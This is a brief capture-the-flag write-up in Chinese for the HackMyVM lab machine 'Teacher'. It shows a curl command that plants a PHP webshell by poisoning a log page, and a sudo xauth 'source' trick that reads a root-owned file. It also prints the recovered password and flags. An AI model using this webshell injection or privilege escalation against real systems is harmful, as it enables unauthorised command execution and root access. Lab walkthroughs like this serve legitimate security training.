# Teacher

2025.03.24 https://hackmyvm.eu/machines/machine.php?vm=Teacher

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 扫描发现 access.php log.php clearlogs.php 这 3 个页面，access.php 访问是空页面，ffuf 探测一下可能的请求参数，发现是 id，在访问 access.php?id=/etc/passwd 后，log.php 页面上会显示访问的参数值，这里可以通过 access.php 写入 webshell，然后通过访问 log.php 进行反弹:

```
curl -G --data-urlencode 'id=<?php system($_GET[1]);?>' 'http://192.168.5.39'
```

获得反弹 shell，在/var/www/html 中发现一个奇怪名的 pdf e14e1598b4271d8449e7fcda302b7975.pdf 下载到 kali 上，查看，可以看到 PASS=ThankYouTeachers 文件的所属用户是 mrteacher 应该就是它的用户密码。

切换到 mrteacher ，拿到了 user flag:

```
www-data@Teacher:/home/mrteacher$ cat user
9cd1f0b79d9474714c5a29214ec839a6
```

sudo -l 显示(ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth

使用 xauth 命令进入交互模式，source 可以读取文件, 读取 root flag：

```
xauth> source /root/root
/bin/xauth: /root/root:1:  unknown command "HappyBack2Sch00l"
```

当然也可以通过 X11 协议，打开 gedit 的窗口，可以直接读取和修改文件。
